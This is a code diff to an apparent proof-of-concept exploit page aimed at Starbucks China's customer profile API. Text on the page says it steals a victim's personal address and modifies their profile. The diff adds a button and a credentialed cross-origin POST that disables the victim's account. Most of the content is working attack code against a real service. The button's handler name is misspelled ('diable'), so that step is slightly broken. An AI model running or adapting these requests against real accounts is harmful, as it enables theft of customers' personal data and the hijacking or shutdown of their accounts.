@@ -19,11 +19,16 @@ click the button to modify the profile of victim's account!
 steal customer's personal address
 <textarea id="customer" style="width: 200px; height: 150px;"></textarea>
 </div>
+</br>
+</br>
+</br>
+<div>
+Attention!click the button will lead your account disabled.
+<button id="disable" onclick="disable()">Disable the starbucks's account</button>
+</div>
 <script>
 
      var xmlhttp1 = new XMLHttpRequest()
-     var xmlhttp2 = new XMLHttpRequest()
-     var xmlhttp3 = new XMLHttpRequest()
      xmlhttp1.onreadystatechange=function()
 	{
 		if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
@@ -79,6 +84,31 @@ steal customer's personal address
 			 },
 			    success : function(response, textStatus, jqXhr) {
 				alert("Successfully !Your account's profile have been modified!");
+			    },
+			    error : function(jqXHR, textStatus, errorThrown) {
+				// log the error to the console
+				console.log("The following error occured: " + textStatus, errorThrown);
+			    },
+			    complete : function() {
+				console.log("complete");
+			    }
+        });
+	}
+	
+	function diable(){
+		var data = {};
+		data["reason1"] = "Customer closed account";
+		$.ajax({
+			    url : 'https://profile.starbucks.com.cn/api/Customers/disable',
+			    type : 'POST',
+			    dataType:'json',
+			    contentType:'application/json',
+			    data:JSON.stringify(data),
+			    xhrFields: {
+			     withCredentials: true
+			 },
+			    success : function(response, textStatus, jqXhr) {
+				alert("Successfully !Your account's was disabled");
 			    },
 			    error : function(jqXHR, textStatus, errorThrown) {
 				// log the error to the console
